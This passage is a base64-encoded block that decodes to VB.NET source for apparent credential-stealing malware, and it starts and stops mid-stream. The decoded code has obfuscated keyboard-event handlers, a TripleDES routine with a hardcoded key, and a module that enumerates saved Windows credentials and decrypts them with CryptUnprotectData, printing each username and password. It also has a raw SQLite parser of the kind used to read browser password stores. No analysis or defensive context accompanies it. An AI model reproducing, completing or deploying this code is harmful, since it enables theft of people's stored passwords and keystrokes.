udDMyLCAwKQ0KICAgICAgICBFbmQgU3ViDQoNCiAgICAgICAgRnJpZW5kIFNoYXJlZCBGdW5jdGlvbiBpc2ZOd2tLaGtva21DZUp0SUxKY0pwKEJ5VmFsIGZkdEdGa3ZOTFFEbG9YV0dVbEJ6amRKWnVYIEFzIEludGVnZXIsIEJ5VmFsIFVaSmtFRG9HdkV0ckROd09WaXhRWnBET2RyIEFzIEludGVnZXIsIEJ5UmVmIFhRUHR3VnNaYnBoSlNnbEFTdllhVmd3a1l4IEFzIEFvY1VSSGlrd0pDamRWYXZ6a0JUV2laZUdLKSBBcyBJbnRlZ2VyDQoNCiAgICAgICAgICAgIElmIChmZHRHRmt2TkxRRGxvWFdHVWxCempkSlp1WCA8PiBaZE5CQVdPbm9JVVN6clFyeCkgVGhlbg0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIFNlbGVjdCBDYXNlIFVaSmtFRG9HdkV0ckROd09WaXhRWnBET2RyDQoNCiAgICAgICAgICAgICAgICAgICAgQ2FzZSBMZ1RUTkNmRkpjSVFRaUJhWSwgdm50bmJWZ3BRbFdjZ3RJekUNCg0KICAgICAgICAgICAgICAgICAgICAgICAgUmFpc2VFdmVudCBnVnJTeUtnWHJZUUFiRER0VFFHdkJvKENUeXBlKFhRUHR3VnNaYnBoSlNnbEFTdllhVmd3a1l4LmZWbktjZFlSbk9KdHB1ckVWZGxabWRTdGlCLCBLZXlzKSkNCiAgICAgICAgICAgICAgICAgICAgQ2FzZSBQdU9ISmJ5UVR0dmlva05ZaCwgQXZZeHJ1b29KZ29yTFNXR05XdFVraFBjeHMNCg0KICAgICAgICAgICAgICAgICAgICAgICAgUmFpc2VFdmVudCBQTEhRTlNwT2hBSGN5VXVQanlJRVREKENUeXBlKFhRUHR3VnNaYnBoSlNnbEFTdllhVmd3a1l4LmZWbktjZFlSbk9KdHB1ckVWZGxabWRTdGlCLCBLZXlzKSkNCiAgICAgICAgICAgICAgICBFbmQgU2VsZWN0DQogICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgUmV0dXJuIE5vdGhpbmcNCiAgICAgICAgRW5kIEZ1bmN0aW9uDQogICAgRW5kIENsYXNzDQoNClByaXZhdGUgUmVhZE9ubHkga2V5KCkgQXMgQnl0ZSA9IF8NCiAgezEsIDIsIDMsIDQsIDUsIDYsIDcsIDgsIDksIDEwLCAxMSwgMTIsIDEzLCAxNCwgXw0KICAxNSwgMTYsIDE3LCAxOCwgMTksIDIwLCAyMSwgMjIsIDIzLCAyNH0NCiAgICBQcml2YXRlIFJlYWRPbmx5IGl2KCkgQXMgQnl0ZSA9IHs4LCA3LCA2LCA1LCA0LCAzLCAyLCAxfQ0KICAgIFByaXZhdGUgWzYyXSBBcyBOZXcgWzYxXShrZXksIGl2KQ0KRW5kIE1vZHVsZQ0KDQoNCkZyaWVuZCBDbGFzcyBbNjFdDQpQcml2YXRlIFs3OF0gQXMgTmV3IFRyaXBsZURFU0NyeXB0b1NlcnZpY2VQcm92aWRlcg0KICAgIFByaXZhdGUgWzc5XSBBcyBOZXcgVVRGOEVuY29kaW5nDQogICAgUHJpdmF0ZSBbODBdKCkgQXMgQnl0ZQ0KICAgIFByaXZhdGUgWzgxXSgpIEFzIEJ5dGUNClB1YmxpYyBTdWIgTmV3KEJ5VmFsIGtleSgpIEFzIEJ5dGUsIEJ5VmFsIGl2KCkgQXMgQnl0ZSkNCiAgICAgICAgTWUuWzgwXSA9IGtleQ0KICAgICAgICBNZS5bODFdID0gaXYNCiAgICBFbmQgU3ViDQpQdWJsaWMgRnVuY3Rpb24gWzYzXShCeVZhbCBbODNdKCkgQXMgQnl0ZSkgQXMgQnl0ZSgpDQogICAgICAgIFJldHVybiBbODJdKFs4M10sIFs3OF0uQ3JlYXRlRGVjcnlwdG9yKFs4MF0sIFs4MV0pKQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBGdW5jdGlvbiBbNjNdKEJ5VmFsIHRleHQgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIFs4M10oKSBBcyBCeXRlID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHRleHQpDQogICAgICAgIERpbSBbODRdKCkgQXMgQnl0ZSA9IFs4Ml0oWzgzXSwgXw0KICAgICAgICAgICAgICAgICAgICAgICAgIFs3OF0uQ3JlYXRlRGVjcnlwdG9yKFs4MF0sIFs4MV0pKQ0KICAgICAgICBSZXR1cm4gWzc5XS5HZXRTdHJpbmcoWzg0XSkNCiAgICBFbmQgRnVuY3Rpb24NCiAgICANCiAgICBQcml2YXRlIEZ1bmN0aW9uIFs4Ml0oQnlWYWwgWzgzXSgpIEFzIEJ5dGUsIF8NCiAgICAgICAgQnlWYWwgQ3J5cHRvVHJhbnNmb3JtIEFzIElDcnlwdG9UcmFuc2Zvcm0pIEFzIEJ5dGUoKQ0KICAgICAgICANCg0KICAgICAgICBEaW0gWzg2XSBBcyBNZW1vcnlTdHJlYW0gPSBOZXcgTWVtb3J5U3RyZWFtDQogICAgICAgIERpbSBbODVdIEFzIENyeXB0b1N0cmVhbSA9IE5ldyBfDQogICAgICAgICAgICBDcnlwdG9TdHJlYW0oWzg2XSwgQ3J5cHRvVHJhbnNmb3JtLCBfDQogICAgICAgICAgICBDcnlwdG9TdHJlYW1Nb2RlLldyaXRlKQ0KICAgICAgICANCiAgICAgICAgWzg1XS5Xcml0ZShbODNdLCAwLCBbODNdLkxlbmd0aCkNCiAgICAgICAgWzg1XS5GbHVzaEZpbmFsQmxvY2soKQ0KICAgICAgICANCg0KICAgICAgICBbODZdLlBvc2l0aW9uID0gMA0KICAgICAgICBEaW0gWzg3XShDVHlwZShbODZdLkxlbmd0aCAtIDEsIFN5c3RlbS5JbnQzMikpIEFzIEJ5dGUNCiAgICAgICAgWzg2XS5SZWFkKFs4N10sIDAsIENUeXBlKFs4N10uTGVuZ3RoLCBTeXN0ZW0uSW50MzIpKQ0KICAgICAgIA0KDQogICAgICAgIFs4Nl0uQ2xvc2UoKQ0KICAgICAgICBbODVdLkNsb3NlKCkNCiAgICAgICAgDQoNCiAgICAgICAgUmV0dXJuIFs4N10NCiAgICBFbmQgRnVuY3Rpb24NCg0KRW5kIGNsYXNzDQoNCg0KDQoNCk1vZHVsZSBNU04NCiAgICA8RGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I6PVRydWUsIENoYXJTZXQ6PUNoYXJTZXQuVW5pY29kZSk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gQ3JlZEVudW1lcmF0ZVcoQnlWYWwgZmlsdGVyIEFzIFN0cmluZywgQnlWYWwgZmxhZyBBcyBVSW50ZWdlciwgQnlWYWwgY291bnQgQXMgVUludGVnZXIsIEJ5VmFsIHBDcmVkZW50aWFscyBBcyBJbnRQdHIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCiAgICA8RGxsSW1wb3J0KCJjcnlwdDMyIiwgQ2hhclNldDo9Q2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3I6PVRydWUpPiBfDQogICAgRnJpZW5kIEZ1bmN0aW9uIENyeXB0VW5wcm90ZWN0RGF0YShCeVJlZiBkYXRhSW4gQXMgREFUQV9CTE9CLCBCeVZhbCBwcHN6RGF0YURlc2NyIEFzIEludGVnZXIsIEJ5VmFsIG9wdGlvbmFsRW50cm9weSBBcyBJbnRlZ2VyLCBCeVZhbCBwdlJlc2VydmVkIEFzIEludGVnZXIsIEJ5VmFsIHBQcm9tcHRTdHJ1Y3QgQXMgSW50ZWdlciwgQnlWYWwgZHdGbGFncyBBcyBJbnRlZ2VyLCBfDQogICAgIEJ5VmFsIHBEYXRhT3V0IEFzIERBVEFfQkxPQikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KICAgIEZyaWVuZCBTdHJ1Y3R1cmUgQ1JFREVOVElBTA0KICAgICAgICBQdWJsaWMgRmxhZ3MgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgVHlwZSBBcyBJbnRlZ2VyDQogICAgICAgIDxNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFdTdHIpPiBfDQogICAgICAgIFB1YmxpYyBUYXJnZXROYW1lIEFzIFN0cmluZw0KICAgICAgICA8TWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBXU3RyKT4gXw0KICAgICAgICBQdWJsaWMgQ29tbWVudCBBcyBTdHJpbmcNCiAgICAgICAgUHVibGljIExhc3RXcml0dGVuIEFzIExvbmcNCiAgICAgICAgUHVibGljIENyZWRlbnRpYWxCbG9iU2l6ZSBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBDcmVkZW50aWFsQmxvYiBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBQZXJzaXN0IEFzIEludGVnZXINCiAgICAgICAgUHVibGljIEF0dHJpYnV0ZUNvdW50IEFzIEludGVnZXINCiAgICAgICAgUHVibGljIEF0dHJpYnV0ZXMgQXMgSW50UHRyDQogICAgICAgIDxNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFdTdHIpPiBfDQogICAgICAgIFB1YmxpYyBUYXJnZXRBbGlhcyBBcyBTdHJpbmcNCiAgICAgICAgPE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQV1N0cik+IF8NCiAgICAgICAgUHVibGljIFVzZXJOYW1lIEFzIFN0cmluZw0KICAgIEVuZCBTdHJ1Y3R1cmUNCiAgICBQcml2YXRlIENyZWQgQXMgQ1JFREVOVElBTA0KICAgIEZyaWVuZCBTdHJ1Y3R1cmUgREFUQV9CTE9CDQogICAgICAgIFB1YmxpYyBjYkRhdGEgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgcGJEYXRhIEFzIEludGVnZXINCiAgICBFbmQgU3RydWN0dXJlDQogICAgRnJpZW5kIFN0cnVjdHVyZSBVc2VyRGV0YWlscw0KICAgICAgICBQdWJsaWMgdU5hbWUgQXMgU3RyaW5nDQogICAgICAgIFB1YmxpYyB1UGFzcyBBcyBTdHJpbmcNCiAgICBFbmQgU3RydWN0dXJlDQogICAgUHVibGljIGNvdW50IEFzIFVJbnRlZ2VyDQogICAgUHVibGljIHBDcmVkZW50aWFscyBBcyBJbnRQdHIgPSBJbnRQdHIuWmVybw0KICAgIFB1YmxpYyBkYXRhSW4gQXMgREFUQV9CTE9CDQogICAgUHVibGljIGRhdGFPdXQgQXMgREFUQV9CTE9CDQogICAgUHVibGljIHVEZXRhaWwgQXMgVXNlckRldGFpbHMNCiAgICBQdWJsaWMgRnVuY3Rpb24gZ2V0UHdkKCkgQXMgU3RyaW5nKCkNCiAgICAgICAgUGFzc3dvcmQoKQ0KICAgICAgICBEaW0gcGFzcyBBcyBTdHJpbmcoKSA9IHt1RGV0YWlsLnVOYW1lLCB1RGV0YWlsLnVQYXNzfQ0KICAgICAgICBSZXR1cm4gcGFzcw0KDQogICAgRW5kIEZ1bmN0aW9uDQogICAgUHVibGljIFN1YiBQYXNzd29yZCgpDQogICAgICAgIFRyeQ0KICAgICAgICAgICAgRGltIHB0ciBBcyBJbnRQdHIgPSBNYXJzaGFsLlJlYWRJbnRQdHIocENyZWRlbnRpYWxzLCAwICogNCkNCiAgICAgICAgICAgIENyZWQgPSBDVHlwZShNYXJzaGFsLlB0clRvU3RydWN0dXJlKHB0ciwgQ3JlZC5bR2V0VHlwZV0oKSksIENSRURFTlRJQUwpDQogICAgICAgICAgICBkYXRhSW4ucGJEYXRhID0gQ3JlZC5DcmVkZW50aWFsQmxvYg0KICAgICAgICAgICAgZGF0YUluLmNiRGF0YSA9IENyZWQuQ3JlZGVudGlhbEJsb2JTaXplDQogICAgICAgICAgICBDcnlwdFVucHJvdGVjdERhdGEoZGF0YUluLCAwLCAwLCAwLCAwLCAxLCBfDQogICAgICAgICAgICAgZGF0YU91dCkNCiAgICAgICAgICAgIGRhdGFPdXQucGJEYXRhID0gZGF0YUluLnBiRGF0YQ0KDQogICAgICAgICAgICB1RGV0YWlsLnVOYW1lID0gQ3JlZC5Vc2VyTmFtZQ0KICAgICAgICAgICAgdURldGFpbC51UGFzcyA9IChNYXJzaGFsLlB0clRvU3RyaW5nVW5pKE5ldyBJbnRQdHIoZGF0YU91dC5wYkRhdGEpKSkNCiAgICAgICAgICAgIERpbSBubCBBcyBTdHJpbmcgPSB2Yk5ld0xpbmUNCiAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+TVNOfn5+fn4iKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiVXNlcm5hbWU6ICIgJiB1RGV0YWlsLnVOYW1lKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgiUGFzc3dvcmQ6ICIgJiB1RGV0YWlsLnVQYXNzKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQobmwpDQogICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dCgifn5+fn5+fn5+fiIpDQogICAgICAgICAgICBFeGl0IFN1Yg0KICAgICAgICBDYXRjaCB4IEFzIEV4Y2VwdGlvbg0KDQogICAgICAgICAgICBFeGl0IFN1Yg0KICAgICAgICBFbmQgVHJ5DQogICAgRW5kIFN1Yg0KRW5kIE1vZHVsZQ0KDQoNCg0KUHVibGljIENsYXNzIFNRTGl0ZUhhbmRsZXINCiAgICBQcml2YXRlIGRiX2J5dGVzKCkgQXMgQnl0ZQ0KICAgIFByaXZhdGUgcGFnZV9zaXplIEFzIFVJbnQxNg0KICAgIFByaXZhdGUgZW5jb2RpbmcgQXMgVUludDY0DQogICAgUHJpdmF0ZSBtYXN0ZXJfdGFibGVfZW50cmllcygpIEFzIHNxbGl0ZV9tYXN0ZXJfZW50cnkNCg0KICAgIFByaXZhdGUgU1FMRGF0YVR5cGVTaXplKCkgQXMgQnl0ZSA9IE5ldyBCeXRlKCkgezAsIDEsIDIsIDMsIDQsIDYsIDgsIDgsIDAsIDB9DQogICAgUHJpdmF0ZSB0YWJsZV9lbnRyaWVzKCkgQXMgdGFibGVfZW50cnkNCiAgICBQcml2YXRlIGZpZWxkX25hbWVzKCkgQXMgU3RyaW5nDQoNCiAgICBQcml2YXRlIFN0cnVjdHVyZSByZWNvcmRfaGVhZGVyX2ZpZWxkDQogICAgICAgIERpbSBzaXplIEFzIEludDY0DQogICAgICAgIERpbSB0eXBlIEFzIEludDY0DQogICAgRW5kIFN0cnVjdHVyZQ0KDQogICAgUHJpdmF0ZSBTdHJ1Y3R1cmUgdGFibGVfZW50cnkNCiAgICAgICAgRGltIHJvd19pZCBBcyBJbnQ2NA0KICAgICAgICBEaW0gY29udGVudCgpIEFzIFN0cmluZw0KICAgIEVuZCBTdHJ1Y3R1cmUNCg0KICAgIFByaXZhdGUgU3RydWN0dXJlIHNxbGl0ZV9tYXN0ZXJfZW50cnkNCiAgICAgICAgRGltIHJvd19pZCBBcyBJbnQ2NA0KICAgICAgICBEaW0gaXRlbV90eXBlIEFzIFN0cmluZw0KICAgICAgICBEaW0gaXRlbV9uYW1lIEFzIFN0cmluZw0KICAgICAgICBEaW0gYXN0YWJsZV9uYW1lIEFzIFN0cmluZw0KICAgICAgICBEaW0gcm9vdF9udW0gQXMgSW50NjQNCiAgICAgICAgRGltIHNxbF9zdGF0ZW1lbnQgQXMgU3RyaW5nDQogICAgRW5kIFN0cnVjdHVyZQ0KDQogICAgUHJpdmF0ZSBGdW5jdGlvbiBHVkwoQnlWYWwgc3RhcnRJbmRleCBBcyBJbnRlZ2VyKSBBcyBJbnRlZ2VyDQogICAgICAgIElmIHN0YXJ0SW5kZXggPiBkYl9ieXRlcy5MZW5ndGggVGhlbiBSZXR1cm4gTm90aGluZw0KDQogICAgICAgIEZvciBpIGFzIGludGVnZXIgPSBzdGFydEluZGV4IFRvIHN0YXJ0SW5kZXggKyA4IFN0ZXAgMQ0KICAgICAgICAgICAgSWYgaSA+IGRiX2J5dGVzLkxlbmd0aCAtIDEgVGhlbg0KICAgICAgICAgICAgICAgIFJldHVybiBOb3RoaW5nDQogICAgICAgICAgICBFbHNlSWYgKGRiX2J5dGVzKGkpIEFuZCAmSDgwKSA8PiAmSDgwIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4gaQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIE5leHQNCg0KICAgICAgICBSZXR1cm4gc3RhcnRJbmRleCArIDgNCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIFByaXZhdGUgRnVuY3Rpb24gQ1ZMKEJ5VmFsIHN0YXJ0SW5kZXggQXMgSW50ZWdlciwgQnlWYWwgZW5kSW5kZXggQXMgSW50ZWdlcikgQXMgSW50NjQNCiAgICAgICAgZW5kSW5kZXggPSBlbmRJbmRleCArIDENCg0KICAgICAgICBEaW0gcmV0dXMoNykgQXMgQnl0ZQ0KICAgICAgICBEaW0gTGVuZ3RoID0gZW5kSW5kZXggLSBzdGFydEluZGV4DQogICAgICAgIERpbSBCaXQ2NCBBcyBCb29sZWFuID0gRmFsc2UNCg0KICAgICAgICBJZiBMZW5ndGggPSAwIE9yIExlbmd0aCA+IDkgVGhlbiBSZXR1cm4gTm90aGluZw0KICAgICAgICBJZiBMZW5ndGggPSAxIFRoZW4NCiAgICAgICAgICAgIHJldHVzKDApID0gKGRiX2J5dGVzKHN0YXJ0SW5kZXgpIEFuZCAmSDdGKQ0KICAgICAgICAgICAgUmV0dXJuIEJpdENvbnZlcnRlci5Ub0ludDY0KHJldHVzLCAwKQ0KICAgICAgICBFbmQgSWYNCg0KICAgICAgICBJZiBMZW5ndGggPSA5IFRoZW4NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgQml0NjQgPSBUcnVlDQogICAgICAgIEVuZCBJZg0KDQogICAgICAgIERpbSBqIEFzIEludGVnZXIgPSAxDQogICAgICAgIERpbSBrIEFzIEludGVnZXIgPSA3DQogICAgICAgIERpbSB5IEFzIEludGVnZXIgPSAwDQoNCiAgICAgICAgSWYgQml0NjQgVGhlbg0KICAgICAgICAgICAgcmV0dXMoMCkgPSBkYl9ieXRlcyhlbmRJbmRleCAtIDEpDQogICAgICAgICAgICBlbmRJbmRleCA9IGVuZEluZGV4IC0gMQ0KICAgICAgICAgICAgeSA9IDENCiAgICAgICAgRW5kIElmDQoNCiAgICAgICAgRm9yIGkgYXMgaW50ZWdlciA9IChlbmRJbmRleCAtIDEpIFRvIHN0YXJ0SW5kZXggU3RlcCAtMQ0KICAgICAgICAgICAgSWYgKGkgLSAxKSA+PSBzdGFydEluZGV4IFRoZW4NCiAgICAgICAgICAgICAgICByZXR1cyh5KSA9ICgoZGJfYnl0ZXMoaSkgPj4gKGogLSAxKSkgQW5kICgmSEZGID4+IGopKSBPciAoZGJfYnl0ZXMoaSAtIDEpIDw8IGspDQogICAgICAgICAgICAgICAgaiA9IGogKyAxDQogICAgICAgICAgICAgICAgeSA9IHkgKyAxDQogICAgICAgICAgICAgICAgayA9IGsgLSAxDQogICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgSWYgTm90IEJpdDY0IFRoZW4gcmV0dXMoeSkgPSAoKGRiX2J5dGVzKGkpID4+IChqIC0gMSkpIEFuZCAoJkhGRiA+PiBqKSkNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0DQoNCiAgICAgICAgUmV0dXJuIEJpdENvbnZlcnRlci5Ub0ludDY0KHJldHVzLCAwKQ0KICAgIEVuZCBGdW5jdGlvbg0KDQoNCiAgICBQcml2YXRlIEZ1bmN0aW9uIElzT2RkKEJ5VmFsIHZhbHVlIEFzIEludDY0KSBBcyBCb29sZWFuDQogICAgICAgIFJldHVybiAodmFsdWUgQW5kIDEpID0gMQ0KICAgIEVuZCBGdW5jdGlvbg0KDQoNCiAgICBQcml2YXRlIEZ1bmN0aW9uIENvbnZlcnRUb0ludGVnZXIoQnlWYWwgc3RhcnRJbmRleCBBcyBJbnRlZ2VyLCBCeVZhbCBTaXplIEFzIEludGVnZXIpIEFzIFVJbnQ2NA0KICAgICAgICBJZiBTaXplID4gOCBPciBTaXplID0gMCBUaGVuIFJldHVybiBOb3RoaW5nDQoNCiAgICAgICAgRGltIHJldFZhbCBBcyBVSW50NjQgPSAwDQoNCiAgICAgICAgRm9yIGkgYXMgaW50ZWdlciA9IDAgVG8gU2l6ZSAtIDEgU3RlcCAxDQogICAgICAgICAgICByZXRWYWwgPSAoKHJldFZhbCA8PCA4KSBPciBkYl9ieXRlcyhzdGFydEluZGV4ICsgaSkpDQogICAgICAgIE5leHQNCg0KICAgICAgICBSZXR1cm4gcmV0VmFsDQogICAgRW5kIEZ1bmN0aW9uDQoNCiAgICBQcml2YXRlIFN1YiBSZWFkTWFzdGVyVGFibGUoQnlWYWwgT2Zmc2V0IEFzIFVJbnQ2NCkNCg0KICAgICAgICBJZiBkYl9ieXRlcyhPZmZzZXQpID0gJkhEIFRoZW4gJ0xlYWYgbm9kZQ0KICAgICAgICAgICAgJ0xlbmd0aCBmb3Igc2V0dGluZyB0aGUgYXJyYXkgbGVuZ3RoIGZvciB0aGUgZW50cmllcw0KICAgICAgICAgICAgRGltIExlbmd0aCBBcyBVSW50MTYgPSBDb252ZXJ0VG9JbnRlZ2VyKE9mZnNldCArIDMsIDIpIC0gMQ0KICAgICAgICAgICAgRGltIG9sIEFzIEludGVnZXIgPSAwDQoNCiAgICAgICAgICAgIElmIE5vdCBtYXN0ZXJfdGFibGVfZW50cmllcyBJcyBOb3RoaW5nIFRoZW4NCiAgICAgICAgICAgICAgICBvbCA9IG1hc3Rlcl90YWJsZV9lbnRyaWVzLkxlbmd0aA0KICAgICAgICAgICAgICAgIFJlRGltIFByZXNlcnZlIG1hc3Rlcl90YWJsZV9lbnRyaWVzKG1hc3Rlcl90YWJsZV9lbnRyaWVzLkxlbmd0aCArIExlbmd0aCkNCiAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICBSZURpbSBtYXN0ZXJfdGFibGVfZW50cmllcyhMZW5ndGgpDQogICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgRGltIGVudF9vZmZzZXQgQXMgVUludDY0DQoNCiAgICAgICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRvIExlbmd0aCBTdGVwIDENCiAgICAgICAgICAgICAgICBlbnRfb2Zmc2V0ID0gQ29udmVydFRvSW50ZWdlcihPZmZzZXQgKyA4ICsgKGkgKiAyKSwgMikNCg0KICAgICAgICAgICAgICAgIElmIE9mZnNldCA8PiAxMDAgVGhlbiBlbnRfb2Zmc2V0ID0gZW50X29mZnNldCArIE9mZnNldA0KDQoNCiAgICAgICAgICAgICAgICBEaW0gdCA9IEdWTChlbnRfb2Zmc2V0KQ0KICAgICAgICAgICAgICAgIERpbSBzaXplIEFzIEludDY0ID0gQ1ZMKGVudF9vZmZzZXQsIHQpDQoNCiAgICAgICAgICAgICAgICBEaW0gcyA9IEdWTChlbnRfb2Zmc2V0ICsgKHQgLSBlbnRfb2Zmc2V0KSArIDEpDQogICAgICAgICAgICAgICAgbWFzdGVyX3RhYmxlX2VudHJpZXMob2wgKyBpKS5yb3dfaWQgPSBDVkwoZW50X29mZnNldCArICh0IC0gZW50X29mZnNldCkgKyAxLCBzKQ0KDQoNCiAgICAgICAgICAgICAgICBlbnRfb2Zmc2V0ID0gZW50X29mZnNldCArIChzIC0gZW50X29mZnNldCkgKyAxDQoNCg0KICAgICAgICAgICAgICAgIHQgPSBHVkwoZW50X29mZnNldCkNCiAgICAgICAgICAgICAgICBzID0gdA0KICAgICAgICAgICAgICAgIERpbSBSZWNfSGVhZGVyX1NpemUgQXMgSW50NjQgPSBDVkwoZW50X29mZnNldCwgdCkgJ1JlY29yZCBIZWFkZXIgTGVuZ3RoDQoNCiAgICAgICAgICAgICAgICBEaW0gRmllbGRfU2l6ZSg0KSBBcyBJbnQ2NA0KDQoNCiAgICAgICAgICAgICAgICBGb3IgaiBhcyBpbnRlZ2VyID0gMCBUbyA0IFN0ZXAgMQ0KICAgICAgICAgICAgICAgICAgICB0ID0gcyArIDENCiAgICAgICAgICAgICAgICAgICAgcyA9IEdWTCh0KQ0KICAgICAgICAgICAgICAgICAgICBGaWVsZF9TaXplKGopID0gQ1ZMKHQsIHMpDQoNCiAgICAgICAgICAgICAgICAgICAgSWYgRmllbGRfU2l6ZShqKSA+IDkgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgSXNPZGQoRmllbGRfU2l6ZShqKSkgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpZWxkX1NpemUoaikgPSAoRmllbGRfU2l6ZShqKSAtIDEzKSAvIDINCiAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWVsZF9TaXplKGopID0gKEZpZWxkX1NpemUoaikgLSAxMikgLyAyDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgRmllbGRfU2l6ZShqKSA9IFNRTERhdGFUeXBlU2l6ZShGaWVsZF9TaXplKGopKQ0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICBOZXh0DQoNCg0KICAgICAgICAgICAgICAgIElmIGVuY29kaW5nID0gMSBUaGVuDQogICAgICAgICAgICAgICAgICAgIG1hc3Rlcl90YWJsZV9lbnRyaWVzKG9sICsgaSkuaXRlbV90eXBlID0gU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUsIEZpZWxkX1NpemUoMCkpDQogICAgICAgICAgICAgICAgRWxzZUlmIGVuY29kaW5nID0gMiBUaGVuDQogICAgICAgICAgICAgICAgICAgIG1hc3Rlcl90YWJsZV9lbnRyaWVzKG9sICsgaSkuaXRlbV90eXBlID0gU3lzdGVtLlRleHQuRW5jb2RpbmcuVW5pY29kZS5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUsIEZpZWxkX1NpemUoMCkpDQogICAgICAgICAgICAgICAgRWxzZUlmIGVuY29kaW5nID0gMyBUaGVuDQogICAgICAgICAgICAgICAgICAgIG1hc3Rlcl90YWJsZV9lbnRyaWVzKG9sICsgaSkuaXRlbV90eXBlID0gU3lzdGVtLlRleHQuRW5jb2RpbmcuQmlnRW5kaWFuVW5pY29kZS5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUsIEZpZWxkX1NpemUoMCkpDQogICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgSWYgZW5jb2RpbmcgPSAxIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgbWFzdGVyX3RhYmxlX2VudHJpZXMob2wgKyBpKS5pdGVtX25hbWUgPSBTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldFN0cmluZyhkYl9ieXRlcywgZW50X29mZnNldCArIFJlY19IZWFkZXJfU2l6ZSArIEZpZWxkX1NpemUoMCksIEZpZWxkX1NpemUoMSkpDQogICAgICAgICAgICAgICAgRWxzZUlmIGVuY29kaW5nID0gMiBUaGVuDQogICAgICAgICAgICAgICAgICAgIG1hc3Rlcl90YWJsZV9lbnRyaWVzKG9sICsgaSkuaXRlbV9uYW1lID0gU3lzdGVtLlRleHQuRW5jb2RpbmcuVW5pY29kZS5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUgKyBGaWVsZF9TaXplKDApLCBGaWVsZF9TaXplKDEpKQ0KICAgICAgICAgICAgICAgIEVsc2VJZiBlbmNvZGluZyA9IDMgVGhlbg0KICAgICAgICAgICAgICAgICAgICBtYXN0ZXJfdGFibGVfZW50cmllcyhvbCArIGkpLml0ZW1fbmFtZSA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkJpZ0VuZGlhblVuaWNvZGUuR2V0U3RyaW5nKGRiX2J5dGVzLCBlbnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9TaXplICsgRmllbGRfU2l6ZSgwKSwgRmllbGRfU2l6ZSgxKSkNCiAgICAgICAgICAgICAgICBFbmQgSWYNCg0KICAgICAgICAgICAgICAgIG1hc3Rlcl90YWJsZV9lbnRyaWVzKG9sICsgaSkucm9vdF9udW0gPSBDb252ZXJ0VG9JbnRlZ2VyKGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUgKyBGaWVsZF9TaXplKDApICsgRmllbGRfU2l6ZSgxKSArIEZpZWxkX1NpemUoMiksIEZpZWxkX1NpemUoMykpDQogICAgICAgICAgICAgICAgSWYgZW5jb2RpbmcgPSAxIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgbWFzdGVyX3RhYmxlX2VudHJpZXMob2wgKyBpKS5zcWxfc3RhdGVtZW50ID0gU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUgKyBGaWV